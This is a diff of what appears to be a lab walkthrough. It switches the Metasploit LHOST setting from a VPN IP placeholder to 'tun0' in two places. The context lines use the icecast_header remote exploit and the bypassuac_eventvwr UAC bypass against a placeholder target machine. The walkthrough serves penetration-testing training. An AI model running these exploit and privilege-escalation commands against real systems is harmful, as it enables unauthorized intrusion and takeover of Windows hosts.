@@ -86,7 +86,7 @@ Exploit target:
 ```
 msf6 exploit(windows/http/icecast_header) > set RHOSTS <MACHINE_IP>
 RHOSTS => <MACHINE_IP>
-msf6 exploit(windows/http/icecast_header) > set LHOST <OPENVPN_IP>
+msf6 exploit(windows/http/icecast_header) > set LHOST tun0
 LHOST => <OPENVPN_IP>
 msf6 exploit(windows/http/icecast_header) > exploit 
 
@@ -215,7 +215,7 @@ Exploit target:
 **Answer**: `LHOST`
 ### What permission listed by `getprivs` allows us to take ownership of files?
 ```
-msf6 exploit(windows/local/bypassuac_eventvwr) > set LHOST <OPENVPN_IP>
+msf6 exploit(windows/local/bypassuac_eventvwr) > set LHOST tun0
 LHOST => <OPENVPN_IP>
 msf6 exploit(windows/local/bypassuac_eventvwr) > run
 
